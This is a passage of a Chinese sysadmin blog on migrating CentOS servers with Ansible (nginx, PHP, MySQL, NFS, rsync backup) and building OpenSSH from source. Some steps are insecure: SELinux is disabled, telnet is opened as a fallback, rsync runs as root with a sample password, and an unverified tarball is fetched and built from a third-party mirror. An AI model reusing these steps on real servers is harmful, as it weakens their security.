class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/^SELINUX/s/SELINUX=enforcing/SELINUX=disabled/&#x27;</span> /etc/selinux/config &amp;&amp;</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;/^SELINUX/s/SELINUX=permissive/SELINUX=disabled/&#x27;</span> /etc/selinux/config</span><br></pre></td></tr></table></figure><h3 id="更新源为阿里云源"><a href="#更新源为阿里云源" class="headerlink" title="更新源为阿里云源"></a>更新源为阿里云源</h3><p>这个过程可能要下载的东西较多，有些主机可能写到大半就连接超时了。<br>对于少许主机可以直连上去执行 yum update</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook  yum_aliyun_source_role.yml</span><br></pre></td></tr></table></figure><h3 id="openssh-安装"><a href="#openssh-安装" class="headerlink" title="openssh 安装"></a>openssh 安装</h3><h4 id="启用-telnet-以防万一"><a href="#启用-telnet-以防万一" class="headerlink" title="启用 telnet 以防万一"></a>启用 telnet 以防万一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&#x27;yum -y install xinetd telnet-server&#x27;</span></span><br><span class="line">ansible webGroup -m shell -a <span class="string">&#x27;ls -ll /etc/xinetd.d/telnet&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="添加用户以防万一"><a href="#添加用户以防万一" class="headerlink" title="添加用户以防万一"></a>添加用户以防万一</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">webGroup</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span> <span class="string">name=username</span> <span class="string">password=yourpassword</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> &#123;&#123; <span class="string">runHost</span> &#125;&#125;</span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">group</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">name=username</span> <span class="string">state=absent</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">username</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span> <span class="string">name=username</span> <span class="string">state=absent</span></span><br></pre></td></tr></table></figure><p>关闭防火墙，让外边的 telnet 请求可以进来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-service=telnet --permanent</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 23 -jACCEPT</span><br><span class="line">iptables -I INPUT -p udp --dport 23 -jACCEPT</span><br><span class="line">service iptables save</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><h4 id="准备工作完成，开始安装-OpenSSH"><a href="#准备工作完成，开始安装-OpenSSH" class="headerlink" title="准备工作完成，开始安装 OpenSSH"></a>准备工作完成，开始安装 OpenSSH</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook openssh_role.yml</span><br></pre></td></tr></table></figure><p>确认是否升级成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&quot;ssh -V&quot;</span></span><br></pre></td></tr></table></figure><p>重启一下主机，等待少许时间并检测 sshd 的状态，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ansible webGroup -m shell -a <span class="string">&quot;reboot&quot;</span></span><br><span class="line"></span><br><span class="line">ansible webGroup -m shell -a <span class="string">&quot;systemctl status sshd&quot;</span></span><br></pre></td></tr></table></figure><p>对于有问题的少许主机可以直连上去执行 systemctl stop sshd 并等待少许执行<br>systemctl start sshd</p><p>开启防火墙，阻止外边的 telnet 请求进来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --remove-service=telnet</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 23 -jDROP</span><br></pre></td></tr></table></figure><h3 id="对相应的服务器安装-nginx-1-16-0"><a href="#对相应的服务器安装-nginx-1-16-0" class="headerlink" title="对相应的服务器安装 nginx 1.16.0"></a>对相应的服务器安装 nginx 1.16.0</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook nginx_role.yml</span><br></pre></td></tr></table></figure><p>nginx的配置根据旧服务器的来就好了.</p><h4 id="nginx-双冗余"><a href="#nginx-双冗余" class="headerlink" title="nginx 双冗余"></a>nginx 双冗余</h4><p><a href="https://github.com/TARI0510/webAnsible/tree/master/roles/keepalived">nginx 存活探测脚本链接</a><br>配置文件的 <a href="#">链接在此</a><br>/<em>/<em>注意事项/</em>/</em></p><p>脚本要用到 killall 命令, 没有的同学记得装, centos killall的包是，不过我的脚本会默认帮你装上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install psmisc</span><br></pre></td></tr></table></figure><p>防火墙的的网卡 eth0 记得跟根据自己的网卡来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT 0 --in-interface eth0 --destination 224.0.0.18 --protocol vrrp -j ACCEPT</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h4 id="nginx-负载均衡"><a href="#nginx-负载均衡" class="headerlink" title="nginx 负载均衡"></a>nginx 负载均衡</h4><p>这个比较容易, 需要注意的是如果用到 session 记得用 哈希法 即添加</p><pre><code>ip_hash; </code></pre><p>到 upsteam 中就好啦</p><h3 id="对相应的服务器安装-PHP7-2"><a href="#对相应的服务器安装-PHP7-2" class="headerlink" title="对相应的服务器安装 PHP7.2"></a>对相应的服务器安装 PHP7.2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook php_role.yml</span><br></pre></td></tr></table></figure><p>根据网上资料推荐使用 sock 而且不是 端口cgi 模式<br>php旧服务器的配置更换了 /etc/php.ini 和 /etc/php-fpm.d/<a href="http://www.conf/">www.conf</a> 文件到新服务中</p><h3 id="对相应的服务器安装-mysql5-7"><a href="#对相应的服务器安装-mysql5-7" class="headerlink" title="对相应的服务器安装 mysql5.7"></a>对相应的服务器安装 mysql5.7</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook mysql_role.yml</span><br></pre></td></tr></table></figure><p>安装完后记得对导入的数据授权喔！！！不然远程连接会被禁止掉的。</p><h3 id="为了方便知道自己操控哪个服务器"><a href="#为了方便知道自己操控哪个服务器" class="headerlink" title="为了方便知道自己操控哪个服务器"></a>为了方便知道自己操控哪个服务器</h3><p>在 /etc/bashrc 或 ~/.bashrc 文件最后添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PS1=<span class="string">&quot;[\u@`hostname -I | cut -d &quot;</span>.<span class="string">&quot; -f 4`\W]# &quot;</span></span><br></pre></td></tr></table></figure><p>然后 source 一下</p><h3 id="调整时间、时区"><a href="#调整时间、时区" class="headerlink" title="调整时间、时区"></a>调整时间、时区</h3><p>由于我的时间和北京时间是一样的, 所以我就省略这步啦!</p><h3 id="nfs-服务器的迁移"><a href="#nfs-服务器的迁移" class="headerlink" title="nfs 服务器的迁移"></a><span id="nfs">nfs 服务器的迁移</span></h3><p><a href="https://github.com/TARI0510/webAnsible/tree/master/mysh">common.sh 和 nfs.sh 脚本位置</a><br>首先配置要使用 nfs 服务的服务器路径</p><pre><code># /etc/exports 文件/home/www/某个站点 ip地址(rw,sync,all_squash,no_subtree_check)/home/www/某个站点 IP地址(rw,sync,all_squash,no_subtree_check)</code></pre><p>/home 路径是下图 mounted on 下的路径<br><img src="/img/Linux_Server_Maintenance/nfs_notice.png" class="lazyload" data-srcset="/img/Linux_Server_Maintenance/nfs_notice.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="notice"></p><p>参数说明:</p><ul><li>rw 读写权限</li><li>sync 数据同步写入内存缓冲区和硬盘, 保证数据一致</li><li>all_squash 所有访问用户都映射为匿名用户或用户组</li><li>no_subtree_check 即使输出目录是一个子目录，nfs服务器也不检查其父目录的权限</li></ul><p>把文件传送到目标服务器balabala～</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl reload nfs</span><br></pre></td></tr></table></figure><p>允许相应服务的防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-service=nfs --permanent --zone=public</span><br><span class="line">firewall-cmd --add-service=mountd --permanent --zone=public</span><br><span class="line">firewall-cmd --add-service=rpc-bind --permanent --zone=public</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>创建相应文件的软连接方便nfs上nginx的使用<br>在web服务器上创建要挂载的文件夹并挂载</p><p>临时挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs nfs的IP地址:路径 本机路径</span><br></pre></td></tr></table></figure><p>/etc/fstab 文件添加以用于开机启动</p><pre><code>nfs的ip地址:路径  本机路径 nfs rw  0 0nfs的ip地址:路径   本机路径 nfs rw  0 0需要主要，两台不同服务器的用户的gid和uid一不一致，不然会出现旧服务器无法写入的现象</code></pre><h3 id="rsync-增量备份"><a href="#rsync-增量备份" class="headerlink" title="rsync 增量备份"></a>rsync 增量备份</h3><p>小前言: 权限明明够，但是一直报这个错：</p><pre><code>rsync: recv_generator: mkdir &quot;test&quot; (in home_131) failed: Permission denied (13)</code></pre><p>后来发现 selinux 没关闭。。。。。。。。。。。。</p><h4 id="首先开放端口吧！"><a href="#首先开放端口吧！" class="headerlink" title="首先开放端口吧！"></a>首先开放端口吧！</h4><p>如果用的是 iptables </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi etc/sysconfig/iptables </span><br></pre></td></tr></table></figure><p>添加</p><pre><code>-A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT</code></pre><p>或者直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT</span><br></pre></td></tr></table></figure><p>然后再重启一下就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart iptables</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-save</span><br></pre></td></tr></table></figure><p>如果用的是 firewalld</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=873/tcp --permanent &amp;&amp;</span><br><span class="line">firewall-cmd --reload &amp;&amp;</span><br><span class="line">firewall-cmd --list-port</span><br></pre></td></tr></table></figure><p>我搭建的 rsync 是这样子的，主服务器 (也就是正在运行Web服务器的服务器) 文件发生改变 (内容改变或者文件本身的增加或者删除) 就会通过监听脚本自动备份到备份服务器</p><p>以下安装和配置 rsync 是参考该链接 <a href="https://mp.weixin.qq.com/s?__biz=MzI5NzY0MzM0OQ==&mid=2247483717&idx=1&sn=e0e0cad1c75062c8ab0ce40afa935a0c&chksm=ecb0bd7fdbc73469dd10aff6a75c7e45b9cf12e71afc1687ef3cf8ba3a58b43e189273b737c7&mpshare=1&scene=1&srcid=&sharer_sharetime=1563862637449&sharer_shareid=96290980786f0825d84f1a8fef954414#rd">站长那些事儿</a></p><h4 id="两台服务器一起安装-rsync"><a href="#两台服务器一起安装-rsync" class="headerlink" title="两台服务器一起安装 rsync"></a>两台服务器一起安装 rsync</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install rsync xinetd -y</span><br></pre></td></tr></table></figure><p>还要增加一个配置文件 (这个配置文件在CentOS7下不存在，我们手动创建)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/xinetd.d/rsync</span><br></pre></td></tr></table></figure><p>内容如下</p><pre><code># default: off# description: The rsync server is a good addition to an ftp server, as it \#       allows crc checksumming etc.service rsync&#123;        disable = no        flags           = IPv6        socket_type     = stream        wait            = no        user            = root        server          = /usr/bin/rsync        server_args     = --daemon        log_on_failure  += USERID&#125;</code></pre><p>是 <a href="https://blog.csdn.net/bwlab/article/details/50556159">从这里</a> 找滴，亲测可用</p><h4 id="接下来是-负责备份的服务器-的事情了"><a href="#接下来是-负责备份的服务器-的事情了" class="headerlink" title="接下来是 负责备份的服务器 的事情了"></a>接下来是 负责备份的服务器 的事情了</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rsyncd.conf</span><br></pre></td></tr></table></figure><p>添加以下内容</p><pre><code>log file = /var/log/rsyncd.logpidfile = /var/run/rsyncd.pidlock file = /var/run/rsync.locksecrets file = /etc/rsync.passmotd file = /etc/rsyncd.Motd#模块名称[test]#你想备份在本服务器哪个路径就填呗path = /home/test#描述随便加comment = just a testuid = 0gid = 0port = 873use chroot = noread only = nolist = nomax connections = 200timeout = 600#认证用户名，可以随便取auth users = test_user#主服务器IP地址hosts allow = 你的ip地址</code></pre><p>认证用户和密码文件，系统原本没有，需要我们手动创建的喔。<br>该文件名字可以随意</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rsync.pass</span><br></pre></td></tr></table></figure><p>里面是内容是 键值对</p><pre><code>test_user:testpass</code></pre><p>这里注意啦，必须是权限必须是 600 喔</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/rsyncd.conf &amp;&amp;</span><br><span class="line">chmod 600 /etc/rsync.pass &amp;&amp;</span><br><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure><p>启动 rsync 有些需要有些不需要， 可能是防火墙原因阻拦了其他端口…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync --daemon --config=/etc/rsyncd.conf --port=873</span><br></pre></td></tr></table></figure><h4 id="接下来到-主服务器-的事情了"><a href="#接下来到-主服务器-的事情了" class="headerlink" title="接下来到 主服务器 的事情了"></a>接下来到 主服务器 的事情了</h4><p>首先创建密码文件，文件名字也是可以随意喔！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd.rsync</span><br></pre></td></tr></table></figure><p>内容注意啦</p><pre><code>testpass</code></pre><p>是 刚刚备份服务器 /etc/rsync.pass 目录下认证用户的密码喔，只需填上面红字的内容就OK啦</p><p>这里权限也要注意，必须是 600 喔</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /etc/passwd.rsync &amp;&amp;</span><br><span class="line">service xinetd restart</span><br></pre></td></tr></table></figure><p>先安装预编译所需要的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install make gcc gcc-c++ -y</span><br></pre></td></tr></table></figure><p>然后下载和安装inotify-tools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src &amp;&amp;</span><br><span class="line">wget https://download.laobuluo.com/tools/inotify-tools-3.14.tar.gz &amp;&amp;</span><br><span class="line">tar -zxvf inotify-tools-3.14.tar.gz &amp;&amp;</span><br><span class="line"><span class="built_in">cd</span> inotify-tools-3.14 &amp;&amp;</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/inotify &amp;&amp;</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=/usr/local/inotify/bin:<span class="variable">$PATH</span>&quot;</span> &gt;&gt;/etc/profile.d/inotify.sh &amp;&amp;</span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/inotify.sh &amp;&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/usr/local/inotify/lib&quot;</span> &gt;/etc/ld.so.conf.d/inotify.conf &amp;&amp;</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/inotify/include /usr/include/inotify</span><br></pre></td></tr></table></figure><p>配置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>注释后面添加</p><pre><code>fs.inotify.max_queued_events=99999999fs.inotify.max_user_watches=99999999fs.inotify.max_user_instances=65535</code></pre><p>创建排除目录列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/inotify/exclude.list</span><br></pre></td></tr></table></figure><p>创建一个排除目录，这里可以添加不同步的目录，一行一个目录。如果暂时没有可以留空，以后需要用到在添加。</p><p>如果 uploads 目录是挂载目录可以排除掉</p><pre><code>    wp-content/uploads/</code></pre><p>增量备份脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/inotify/rsync.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#主服务器需要备份的目录</span></span><br><span class="line">srcdir=/home/<span class="built_in">test</span></span><br><span class="line"><span class="comment">#模块名称</span></span><br><span class="line">dstdir=<span class="built_in">test</span></span><br><span class="line">excludedir=/usr/<span class="built_in">local</span>/inotify/exclude.list</span><br><span class="line"><span class="comment">#认证名称</span></span><br><span class="line">rsyncuser=test_user</span><br><span class="line"><span class="comment">#本机存密码的目录</span></span><br><span class="line">rsyncpassdir=/etc/passwd.rsync</span><br><span class="line"><span class="comment">#备份服务器的IP地址</span></span><br><span class="line">dstip=<span class="string">&quot;备份服务器滴IP地址&quot;</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$dstip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rsync -avH --port=873 --progress --delete --exclude-from=<span class="variable">$excludedir</span> <span class="variable">$srcdir</span> <span class="variable">$rsyncuser</span>@<span class="variable">$ip</span>::<span class="variable">$dstdir</span> --password-file=<span class="variable">$rsyncpassdir</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">/usr/<span class="built_in">local</span>/inotify/bin/inotifywait -mrq --timefmt <span class="string">&#x27;%d/%m/%y %H:%M&#x27;</span> --format <span class="string">&#x27;%T %w%f%e&#x27;</span> -e close_write,modify,delete,create,attrib,move <span class="variable">$srcdir</span> | <span class="keyword">while</span> <span class="built_in">read</span> file</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="variable">$dstip</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rsync -avH --port=873 --progress --delete --exclude-from=<span class="variable">$excludedir</span> <span class="variable">$srcdir</span> <span class="variable">$rsyncuser</span>@<span class="variable">$ip</span>::<span class="variable">$dstdir</span> --password-file=<span class="variable">$rsyncpassdir</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; <span class="variable">$&#123;file&#125;</span> was rsynced&quot;</span> &gt;&gt; /tmp/rsync.log 2&gt;&amp;1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>脚本可执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /usr/<span class="built_in">local</span>/inotify/rsync.sh</span><br></pre></td></tr></table></figure><p>添加开机启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><p>开机启动文件中最后一行添加</p><pre><code>sh /usr/local/inotify/rsync.sh &amp;</code></pre><h3 id="通过互换-ip-迁移服务器"><a href="#通过互换-ip-迁移服务器" class="headerlink" title="通过互换 ip 迁移服务器"></a>通过互换 ip 迁移服务器</h3><p>Centos重启网络配置文件会导致 /etc/resolv.conf 被覆盖或清空 进而导致 yum 无法使用</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> ansible </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Install_OpenSSH8.0p1_from_source</title>
      <link href="//p/2019/Install-OpenSSH8-0p1-from-source/"/>
      <url>//p/2019/Install-OpenSSH8-0p1-from-source/</url>
      
        <content type="html"><![CDATA[<h3 id="系统环境-CentOS-7-x86-64-Minimal-1511"><a href="#系统环境-CentOS-7-x86-64-Minimal-1511" class="headerlink" title="系统环境: CentOS-7-x86_64-Minimal-1511"></a>系统环境: CentOS-7-x86_64-Minimal-1511</h3><h3 id="root用户-备份-下载包-校验包-一气呵成"><a href="#root用户-备份-下载包-校验包-一气呵成" class="headerlink" title="root用户+备份+下载包+校验包 一气呵成"></a>root用户+备份+下载包+校验包 一气呵成</h3><h4 id="Package-Information-包的相关信息"><a href="#Package-Information-包的相关信息" class="headerlink" title="Package Information (包的相关信息)"></a>Package Information (包的相关信息)</h4><ul><li><p>Download (HTTP): <a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz">https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-8.0p1.tar.gz</a></p></li><li><p>Download MD5 sum: bf050f002fe510e1daecd39044e1122d</p></li><li><p>Download size: 1.5 MB</p></li><li><p>Estimated disk space required: 45 MB (add 12 MB for tests)</p></li><li><p>Estimated build time: 0.4 SBU (running the tests takes 17+ minutes, irrespective of processor speed)</p></li></ul><h3 id="虽然没出过事-但还是要留条退路"><a href="#虽然没出过事-但还是要留条退路" class="headerlink" title="虽然没出过事, 但还是要留条退路"></a>虽然没出过事, 但还是要留条退路</h3><p>安装 telnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install telnet-server.x86_64 &amp;&amp;</span><br><span class="line">yum -y install telnet.x86_64</span><br></pre></td></tr></table></figure><p>安装 xinetd (提供访问和日志管理等功能)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install xinetd.x86_64</span><br></pre></td></tr></table></figure><p>开启服务 &amp;&amp; 开机启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start xinetd &amp;&amp;</span><br><span class="line">systemctl start telnet.socket &amp;&amp;</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> telnet.socket &amp;&amp;</span><br><span class="line">systemctl <span class="built_in">enable</span> xinetd.service </span><br></pre></td></tr></table></figure><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>如果直接上可能出现以下 4 个问题:</p><h4 id="一"><a href="#一" class="headerlink" title="一"></a>一</h4><pre><code>checking for cc... nochecking for gcc... noconfigure: error: in \`/root/openssh-8.0p1&#39;:configure: error: no acceptable C compiler found in $PATHSee \`config.log&#39; for more details</code></pre><p>缺少 cc 和 gcc 编译器, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install cc gcc</span><br></pre></td></tr></table></figure><h4 id="二"><a href="#二" class="headerlink" title="二"></a>二</h4><pre><code>checking for zlib.h... noconfigure: error: *** zlib.h missing - please install first or check config.log ***</code></pre><p>缺少 zlib-devel 环境, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install zlib-devel</span><br></pre></td></tr></table></figure><h4 id="三"><a href="#三" class="headerlink" title="三"></a>三</h4><pre><code>configure: error: *** working libcrypto not found, check config.log</code></pre><p>libcrypto 有点眼熟…<br>解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openssl-devel</span><br></pre></td></tr></table></figure><h4 id="四"><a href="#四" class="headerlink" title="四"></a>四</h4><pre><code>configure: error: PAM headers not found</code></pre><p>缺少pam-devel环境, 解决方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install pam-devel</span><br></pre></td></tr></table></figure><p>设置适当的环境以用于其他安装步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">install  -v -m700 -d /var/lib/sshd &amp;&amp;</span><br><span class="line">chown    -v root:sys /var/lib/sshd &amp;&amp;</span><br><span class="line"></span><br><span class="line">groupadd -g 50 sshd        &amp;&amp;</span><br><span class="line">useradd  -c <span class="string">&#x27;sshd PrivSep&#x27;</span> \</span><br><span class="line">         -d /var/lib/sshd  \</span><br><span class="line">         -g sshd           \</span><br><span class="line">         -s /bin/<span class="literal">false</span>     \</span><br><span class="line">         -u 50 sshd</span><br></pre></td></tr></table></figure><p>安装官网的编译应该木得问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 